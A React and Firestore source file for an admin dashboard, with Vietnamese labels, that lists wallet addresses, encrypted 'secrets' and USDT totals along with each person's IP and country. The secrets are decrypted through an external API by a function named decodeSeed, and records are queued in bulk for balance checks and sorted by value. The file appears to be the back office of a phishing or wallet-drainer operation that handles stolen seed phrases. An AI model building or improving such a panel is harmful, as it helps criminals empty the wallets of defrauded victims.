import React, { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";

import {
  collection,
  deleteDoc,
  doc,
  getDocs,
  orderBy,
  query,
  updateDoc,
  writeBatch,
  where
} from "firebase/firestore";
import { db } from "../../firebase";
import moment from "moment";
import "../admin/index.scss";
import { UserOutlined } from "@ant-design/icons";
import { Button, DatePicker, Form, Input, Pagination } from "antd";
const { RangePicker } = DatePicker;

const statusClasses = {
  2: "bg-green-200 text-green-800",
  0: "bg-yellow-200 text-yellow-800",
  3: "bg-red-200 text-red-800",
  1: "bg-blue-200 text-blue-800",
};

const AdminPage = () => {
    const navigate = useNavigate();
  const [users, setUsers] = useState([]);
  const [totalRecord, setTotalRecords] = useState(1);
  const [currentPage, setCurrentPage] = useState(1);
  const [pageSize] = useState(30);
  const [sortConfig, setSortConfig] = useState({ key: null, order: null });
  const usersRef = collection(db, "mydata");
  const q = query(usersRef, orderBy("createdAt", "desc"));
  const audioRef = useRef(null);
  const [isSwitchOn, setIsSwitchOn] = useState(false);
  const [reload, setReload] = useState(false);
  const [filter, setFilter] = useState({});
  const [secrets, setSecrets] = useState({});
  useEffect(() => {
    const isMuted = localStorage.getItem("isMuted");
    setIsSwitchOn(isMuted === "true");
  }, []);

  const toggleSwitch = (e) => {
    setIsSwitchOn(e.target.checked);
    localStorage.setItem("isMuted", e.target.checked);
  };

  const filteredUsers = (userList) => {
    const { "range-time": dateRange, findkey } = filter;
    return userList.filter((user) => {
      //if (user.s === 0) return false;
      if (
        findkey &&
        !(
          user.wallet.toLowerCase().includes(findkey.trim().toLowerCase()) ||
          user.secret.toLowerCase().includes(findkey.trim().toLowerCase())
        )
      ) {
        return false;
      }
      if (dateRange) {
        const userDate = moment(user.createdAt);
        const startDate = moment(dateRange[0], "YYYY-MM-DD");
        const endDate = moment(dateRange[1], "YYYY-MM-DD");
        if (!userDate.isBetween(startDate, endDate, null, "[]")) {
          return false;
        }
      }
      return true;
    });
  };
  /*
  useEffect(() => {
    const fetchData = async () => {
      const querySnapshot = await getDocs(q);
      let userList = querySnapshot.docs.map((doc) => ({
        userID: doc.id,
        ...doc.data(),
      }));
      userList = filteredUsers(userList);
      if (sortConfig.key) {
        userList.sort((a, b) => {
          if (sortConfig.key === "country") {
            const countryA = a.ip?.country?.toLowerCase() || "";
            const countryB = b.ip?.country?.toLowerCase() || "";
            return sortConfig.order === "asc"
              ? countryA.localeCompare(countryB)
              : countryB.localeCompare(countryA);
          }
          if (sortConfig.key === "total") {
            const cleanA = parseFloat((a.total || "0").replace(/[^0-9.]/g, "")) || 0;
            const cleanB = parseFloat((b.total || "0").replace(/[^0-9.]/g, "")) || 0;
            return sortConfig.order === "asc" ? cleanA - cleanB : cleanB - cleanA;
          }
          return 0;
        });
      }
      const offset = (currentPage - 1) * pageSize;
      const usersPerPage = userList.slice(offset, offset + pageSize);
      setUsers(usersPerPage);
      setTotalRecords(userList.length);
    };
    fetchData();
  }, [currentPage, reload, sortConfig]);
  */

  useEffect(() => {
  const fetchData = async () => {
    try {
      const querySnapshot = await getDocs(q);

      // Lấy danh sách người dùng
      let userList = querySnapshot.docs.map((doc) => ({
        userID: doc.id,
        ...doc.data(),
      }));

      // Lọc danh sách
      userList = filteredUsers(userList);

      // Sắp xếp theo sortConfig
      if (sortConfig.key) {
        userList.sort((a, b) => {
          if (sortConfig.key === "country") {
            const countryA = a.ip?.country?.toLowerCase() || "";
            const countryB = b.ip?.country?.toLowerCase() || "";
            return sortConfig.order === "asc"
              ? countryA.localeCompare(countryB)
              : countryB.localeCompare(countryA);
          }
          if (sortConfig.key === "total") {
            const cleanA = parseFloat((a.total || "0").replace(/[^0-9.]/g, "")) || 0;
            const cleanB = parseFloat((b.total || "0").replace(/[^0-9.]/g, "")) || 0;
            return sortConfig.order === "asc" ? cleanA - cleanB : cleanB - cleanA;
          }
          return 0;
        });
      }
      const offset = (currentPage - 1) * pageSize;
      const usersPerPage = userList
        .slice(offset, offset + pageSize)
        .map((user, index) => ({
          ...user,
          auto_increment: userList.length - (offset + index),
        }));

      setUsers(usersPerPage);
      setTotalRecords(userList.length);
    } catch (error) {
      console.error("Error fetching users:", error);
    }
  };

  fetchData();
}, [currentPage, reload, sortConfig]);

  
  const handlePageChange = (page) => {
    setCurrentPage(page);
  };
  
  const handleStatus = async (statusval, userID) => {
    if (confirm("Are you sure to change status?")) {
      const userRef = doc(db, "mydata", userID);
      await updateDoc(userRef, {
        status: 0,
      });
      setReload((prev) => !prev);
    }
  };
  
//   const handleStatus = async (statusval, userID) => {
//   if (confirm("Are you sure to change status?")) {
//     const userRef = doc(db, "mydata", userID);
//     // Xác định trạng thái mới
//     let newStatus;
//     if (statusval > 1) {
//       newStatus = 1;
//     } else if (statusval === 1) {
//       newStatus = 0;
//     } else {
//       newStatus = statusval; 
//       //giữ nguyên nếu status <=0
//     }
//     await updateDoc(userRef, {
//       status: newStatus,
//     });
//     setReload((prev) => !prev);
//   }
// };


  const updateAllUserStatus = async () => {
  try {
    const confirm = window.confirm("Bạn có chắc muốn cập nhật toàn bộ status?");
    if (!confirm) return;
    //alert('Lên lịch check balance thất bại!');
    //return;
    const q = query(usersRef, orderBy("createdAt", "asc"));
    const snapshot = await getDocs(q);
    if (snapshot.empty) {
      alert("Không có user nào trong collection!");
      return;
    }
    console.log(`Tổng số user cần cập nhật: ${snapshot.size}`);
    const BATCH_LIMIT = 500;
    let batch = writeBatch(db);
    let counter = 0;
    let totalCommitted = 0;
    for (const docSnap of snapshot.docs) {
      batch.update(docSnap.ref, { status: 1 });
      counter++;
      // Khi đủ 500 docs thì commit batch hiện tại và khởi tạo batch mới
      if (counter === BATCH_LIMIT) {
        await batch.commit();
        totalCommitted += counter;
        console.log(`Đã cập nhật ${totalCommitted}/${snapshot.size} user`);
        batch = writeBatch(db);
        counter = 0;
      }
    }
    // Commit phần dư cuối cùng (nếu có)
    if (counter > 0) {
      await batch.commit();
      totalCommitted += counter;
      console.log(`Đã cập nhật ${totalCommitted}/${snapshot.size} user`);
    }
    setReload((prev) => !prev);
    alert('Lên lịch check balance thành công!');
  } catch (error) {
    console.error("❌ Lỗi cập nhật:", error);
    alert('Lên lịch check balance thất bại!');
  }
};

  const handleDelete = async (userID) => {
    if (confirm("Are you want to delete this data?")) {
      var key = prompt("Enter a key", "");
      if (key === "delete") {
        const userRef = doc(db, "mydata", userID);
        await updateDoc(userRef, {
          s: 0,
        });
        setReload((prev) => !prev);
      }
    }
  };

  const onFinish = (fieldsValue) => {
    let findkey = fieldsValue["txt-search-key"];
    const values = { findkey };
    const rangeTimeValue = fieldsValue["range-time"];
    if (rangeTimeValue) {
      values["range-time"] = [
        rangeTimeValue[0].format("YYYY-MM-DD HH:mm:ss"),
        rangeTimeValue[1].format("YYYY-MM-DD HH:mm:ss"),
      ];
    }
    setFilter(values);
    setCurrentPage(1);
    setReload((prv) => !prv);
  };

  const handleSort = (key) => {
    setSortConfig((prev) => {
      if (prev.key === key) {
        if (prev.order === "asc") return { key, order: "desc" };
        if (prev.order === "desc") return { key: null, order: null };
      }
      return { key, order: "asc" };
    });
    setReload((prev) => !prev);
  };


const decodeSeed = async (seed) => {
    var decodeSeed = '';
    try {
      const response = await fetch(import.meta.env.VITE_PUBLIC_API_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ txt:seed}), 
      });
      if (response.ok) {
         const data = await response.json();
         decodeSeed = data.dec;
      }
    } catch (err) {
      console.log(err);
    }
    return decodeSeed;
  };


  return (
    <div className="container mx-auto mt-8 px-2">
      <audio ref={audioRef} src="/music/tigitig.mp3"></audio>
      <h1 className="text-2xl font-bold mb-4">Danh sách người dùng</h1>

      {/* Bộ lọc */}
      <div className="w-full flex flex-col md:flex-row md:items-center gap-3 mb-4">
        <label className="relative inline-flex items-center cursor-pointer">
          <input
            type="checkbox"
            checked={isSwitchOn}
            onChange={toggleSwitch}
            className="sr-only peer"
          />
          <div className="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:bg-blue-600 after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:after:translate-x-full peer-checked:after:border-white"></div>
          <span className="ml-3 text-sm font-medium">Tắt tiếng</span>
        </label>

        <Form
          name="time_related_controls"
          onFinish={onFinish}
          layout="inline"
          className="flex-1 flex flex-wrap gap-2"
        >
          <Form.Item name="txt-search-key">
            <Input
              allowClear
              prefix={<UserOutlined />}
              placeholder="Wallet hoặc Secret"
            />
          </Form.Item>
          <Form.Item name="range-time">
            <RangePicker format="DD-MM-YYYY" />
          </Form.Item>
          <Form.Item>
            <Button type="primary" htmlType="submit" className="bg-blue-600">
              Tìm kiếm
            </Button>
          </Form.Item>
                    <Form.Item>
  <Button
    type="success"
    className="bg-green-600 text-white"
    onClick={(e) => {
         e.preventDefault();
         navigate("/admin/stats");
    }}
  >
    Thống kê
  </Button>                
</Form.Item>
<Form.Item>
 <Button
    type="success"
    className="bg-indigo-600 text-white"
    onClick={(e) => {
        updateAllUserStatus();
    }}
  >
    Balance All
  </Button>                     
</Form.Item>
        </Form>
      </div>

      {/* ✅ Sort 2 chiều cho Mobile */}
      <div className="flex flex-wrap gap-2 mb-4 md:hidden items-center">
        <select
          value={sortConfig.key || ""}
          onChange={(e) => {
            const key = e.target.value;
            setSortConfig({ key, order: sortConfig.order || "asc" });
            setReload((prev) => !prev);
          }}
          className="px-3 py-1 rounded border"
        >
          <option value="">-- Cột sắp xếp --</option>
          <option value="country">Country</option>
          <option value="total">Total USDT</option>
        </select>

        <select
          value={sortConfig.order || ""}
          onChange={(e) => {
            const order = e.target.value;
            setSortConfig((prev) => ({ ...prev, order }));
            setReload((prev) => !prev);
          }}
          className="px-3 py-1 rounded border"
        >
          <option value="">-- Hướng sắp xếp --</option>
          <option value="asc">Tăng dần</option>
          <option value="desc">Giảm dần</option>
        </select>

        <Button
          onClick={() => {
            setSortConfig({ key: null, order: null });
            setReload((prev) => !prev);
          }}
        >
          Reset
        </Button>

        {sortConfig.key && (
          <span className="px-2 py-1 bg-gray-200 rounded text-sm">
            {sortConfig.key} ({sortConfig.order === "asc" ? "↑" : "↓"})
          </span>
        )}
      </div>

      {/* Danh sách */}
      <div>
        {/* Desktop Table */}
        <div className="w-full overflow-x-auto overflow-y-hidden rounded-lg shadow hidden md:block">
          <table className="min-w-max border-collapse border border-gray-300">
            <thead>
              <tr>
                <th className="py-2 px-4 bg-gray-200">No.</th>
                <th className="py-2 px-4 bg-gray-200">Src.</th>
                <th className="py-2 px-4 bg-gray-200">Status</th>
                   <th className="py-2 px-4 bg-gray-200">S</th>
                <th className="py-2 px-4 bg-gray-200">Wallet</th>
                <th className="py-2 px-4 bg-gray-200">Secret</th>
                <th
                  className="py-2 px-4 bg-gray-200 cursor-pointer select-none"
                  onClick={() => handleSort("total")}
                >
                  Total USDT{" "}
                  {sortConfig.key === "total"
                    ? sortConfig.order === "asc"
                      ? "▲"
                      : "▼"
                    : ""}
                </th>
                <th className="py-2 px-4 bg-gray-200">Time</th>
                <th className="py-2 px-4 bg-gray-200">IP</th>
                <th
                  className="py-2 px-4 bg-gray-200 cursor-pointer select-none"
                  onClick={() => handleSort("country")}
                >
                  Country{" "}
                  {sortConfig.key === "country"
                    ? sortConfig.order === "asc"
                      ? "▲"
                      : "▼"
                    : ""}
                </th>
                <th className="py-2 px-4 bg-gray-200">Action</th>
              </tr>
            </thead>
            <tbody>
              {users.map((user) => (
                <tr key={user.userID}>
                  <td className="py-2 px-4 border">{user.auto_increment}</td>
                  <td className="py-2 px-4 border">{user.src}</td>
                  <td className="py-2 px-4 border">
                    <span
                      className={`px-2 py-1 rounded text-xs font-medium ${
                        statusClasses[user.status] || "bg-slate-200 text-slate-800"
                      }`}
                    >
                      {user.status === 0
                        ? "Chưa xử lý"
                        : user.status === 1
                        ? "Đang xử lý"
                        : user.status === 2
                        ? "Xử lý thành công"
                        : user.status === -1
                        ? "Xử lý lỗi"
                        : "Không xác định"}
                    </span>
                  </td>
                                    <td className="py-2 px-4 border">{user.s}</td>

                  <td className="py-2 px-4 border">{user.wallet}</td>
                  <td className="py-2 px-4 border">
                    <textarea
                      onClick={async (e) => {
                        const decrypted = await decodeSeed(user.secret);
                        e.target.value = decrypted; // cập nhật trực tiếp lên UI
                      }}
                      value={user.secret} 
                      rows="2"
                      className="w-full border rounded"
                      readOnly
                    />
                  </td>
                  <td className="py-2 px-4 border">{user.total}</td>
                  <td className="py-2 px-4 border">
                    {moment(user.createdAt).format("YYYY-MM-DD HH:mm:ss")}
                  </td>
                  <td className="py-2 px-4 border">
                    {user.ip ? (user.ip.IP || user.ip.ip ) : "Unknown"}
                  </td>
                  <td className="py-2 px-4 border">
                    {user.ip ? (user.ip.country || user.ip.country_code) : "Unknown"}
                  </td>
                  <td className="py-2 px-4 border flex gap-2 flex-wrap">
                    <button className="min-w-fit px-3 py-1 rounded text-white text-sm bg-green-600"
                      onClick={() => handleStatus(user.status, user.userID)}
                    >
                      Balance
                    </button>
                    <button
                      className="min-w-fit px-3 py-1 rounded bg-red-600 text-white text-sm"
                      onClick={() => handleDelete(user.userID)}
                    >
                      Delete
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        {/* Mobile Cards */}
        <div className="grid grid-cols-1 gap-4 md:hidden">
          {users.map((user) => (
            <div
              key={user.userID}
              className="bg-white rounded-lg shadow p-4 space-y-2"
            >
              <div className="flex justify-between">
                <span className="text-sm font-semibold">No: {user.auto_increment}</span>
                <span className="text-sm font-semibold">Src: {user.src}</span>
                <span
                  className={`px-2 py-1 rounded text-xs font-medium ${
                    statusClasses[user.status] || "bg-slate-200 text-slate-800"
                  }`}
                >
                  {user.status === 0
                    ? "Chưa xử lý"
                    : user.status === 1
                    ? "Đang xử lý"
                    : user.status === 2
                    ? "Xử lý thành công"
                    : user.status === -1
                    ? "Xử lý lỗi"
                    : "Không xác định"}
                </span>
              </div>
              <div>
                <b>Wallet:</b> {user.wallet}
              </div>
              <div>
                <b>Secret:</b>
                <textarea
                  onClick={async (e) => {
                      const decrypted = await decodeSeed(user.secret);
                      e.target.value = decrypted; // cập nhật trực tiếp lên UI
                  }}
                  value={user.secret}
                  rows="2"
                  className="w-full border rounded"
                  readOnly
                />
              </div>
              <div>
                <b>Total USDT:</b> {user.total}
              </div>
              <div>
                <b>Time:</b>{" "}
                {moment(user.createdAt).format("YYYY-MM-DD HH:mm:ss")}
              </div>
              <div>
                <b>IP:</b> {user.ip ? (user.ip.IP || user.ip.ip) : "Unknown"}
              </div>
              <div>
                <b>Country:</b> {user.ip ? (user.ip.country || user.ip.country_code) : "Unknown"}
              </div>
              <div className="flex gap-2 mt-2">
                <button className="flex-1 px-3 py-1 rounded text-white text-sm bg-green-600"
                  onClick={() => handleStatus(user.status, user.userID)}
                >
                  Balance
                </button>
                <button
                  className="flex-1 px-3 py-1 rounded bg-red-600 text-white text-sm"
                  onClick={() => handleDelete(user.userID)}
                >
                  Delete
                </button>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Phân trang */}
      <div className="mt-4 flex justify-center">
        <Pagination
          showQuickJumper
          current={currentPage}
          pageSize={pageSize}
          defaultCurrent={1}
          total={totalRecord}
          onChange={handlePageChange}
        />
      </div>
    </div>
  );
};

export default AdminPage;
